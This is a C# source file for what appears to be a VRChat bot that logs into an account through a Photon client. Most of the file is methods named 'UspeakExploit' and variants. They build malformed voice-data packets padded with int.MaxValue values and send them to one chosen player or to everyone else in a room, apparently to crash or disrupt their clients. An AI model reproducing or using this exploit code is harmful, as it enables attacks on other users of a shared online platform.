using Photon.Realtime;
using System;
using System.IO;
using System.IO.Compression;
using VRChatAPI;

namespace TheBotUI.Core
{

    public class Bot
    {
        public PhotonClient PhotonClient { get; set; }
        public Client APIClient { get; set; }
        public string CachedRoomID { get; set; }
        string path = @"release.txt";
        public Bot(string username, string password)
        {
            APIClient = new Client(username, password);
            StreamReader sr = File.OpenText(path);
            string line = null;
            line = sr.ReadLine();
            PhotonClient = new PhotonClient(APIClient.Variables, line);
        }

        public byte nextChannel = 77;

        public byte GetNextChannel()
        {
            byte b = nextChannel;
            nextChannel += 1;   
            if (nextChannel > 22)
                nextChannel = 1;
            return b;
        }
        //OpRaiseEvent OpRaiseEvent = new OpRaiseEvent();
        public void UspeakExploit(int actNum)
        {
            int num = 0;
            byte[] array = new byte[255];
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 4;
            Buffer.BlockCopy(BitConverter.GetBytes(PhotonClient.LoadBalancingPeer.ServerTimeInMilliSeconds), 0, array, num, 4);
            num += 8;
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 10;
            Buffer.BlockCopy(BitConverter.GetBytes(int.MaxValue), 0, array, num, 4);
            num += 4;
            Buffer.BlockCopy(BitConverter.GetBytes(PhotonClient.LoadBalancingPeer.ServerTimeInMilliSeconds), 0, array, num, 4);
            num += 8;
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 10;
            Buffer.BlockCopy(BitConverter.GetBytes(int.MaxValue), 0, array, num, 4);
            num += 4;
            Buffer.BlockCopy(BitConverter.GetBytes(PhotonClient.LoadBalancingPeer.ServerTimeInMilliSeconds), 0, array, num, 4);
            num += 8;
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 10;
            Buffer.BlockCopy(BitConverter.GetBytes(int.MaxValue), 0, array, num, 4);

            this.PhotonClient.LoadBalancingPeer.OpRaiseEvent(1, array, new RaiseEventOptions()
            {
                TargetActors = new int[] { actNum }
            }, new ExitGames.Client.Photon.SendOptions
            {
             //   Channel = GetNextChannel(),
                Reliability = true,
                DeliveryMode = ExitGames.Client.Photon.DeliveryMode.Unreliable
            });
        }



        public void DoUspeakExploit()
        {
            int num = 0;
            byte[] array = new byte[255];
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 4;
            Buffer.BlockCopy(BitConverter.GetBytes(PhotonClient.LoadBalancingPeer.ServerTimeInMilliSeconds), 0, array, num, 4);
            num += 8;
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 44;
            Buffer.BlockCopy(BitConverter.GetBytes(int.MaxValue), 0, array, num, 4);

            this.PhotonClient.LoadBalancingPeer.OpRaiseEvent(1, array, new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.Others,
                CachingOption = EventCaching.DoNotCache,
            }, new ExitGames.Client.Photon.SendOptions
            {
                Channel = GetNextChannel(),
                Reliability = true,
                DeliveryMode = ExitGames.Client.Photon.DeliveryMode.Unreliable
            });
        }
        public void QUspeakExploit()
        {
            int num = 0;
            byte[] array = new byte[255];
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 4;
            Buffer.BlockCopy(BitConverter.GetBytes(PhotonClient.LoadBalancingPeer.ServerTimeInMilliSeconds), 0, array, num, 4);
            num += 8;
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, num, 2);
            num += 10;
            Buffer.BlockCopy(BitConverter.GetBytes(int.MaxValue), 0, array, num, 4);

            this.PhotonClient.LoadBalancingPeer.OpRaiseEvent(1, array, new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.Others,
                CachingOption = EventCaching.DoNotCache,
            }, new ExitGames.Client.Photon.SendOptions
            {
                Channel = GetNextChannel(),
                Reliability = true,
                DeliveryMode = ExitGames.Client.Photon.DeliveryMode.Unreliable
            });
        }

        public void QQUspeakExploit(int actNum)
        {

        }

        //public static byte[] AudioClipToBytes(AudioClip clip)
        //{
        //    float[] samples = new float[clip.samples * clip.channels];
        //    clip.GetData(samples, 0);

        //    byte[] data = new byte[clip.samples * clip.channels];
        //    for (int i = 0; i < samples.Length; i++)
        //    {
        //        //convert to the -128 to +128 range
        //        float conv = samples[i] * 128.0f;
        //        int c = Mathf.RoundToInt(conv);
        //        c += 127;
        //        if (c < 0)
        //            c = 0;
        //        if (c > 255)
        //            c = 255;

        //        data[i] = (byte)c;
        //    }

        //    return data;
        //}

        private static byte[] unzip(byte[] data)
        {
            GZipStream decoder = new GZipStream(new MemoryStream(data), CompressionMode.Decompress);
            MemoryStream outstream = new MemoryStream();
            CopyStream(decoder, outstream);
            return outstream.ToArray();
        }
        private static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[32768];
            //long TempPos = input.Position;
            while (true)
            {
                int read = input.Read(buffer, 0, buffer.Length);
                if (read <= 0) break;
                output.Write(buffer, 0, read);
            }
            //input.Position = TempPos;// or you make Position = 0 to set it at the start 
        }

    }
}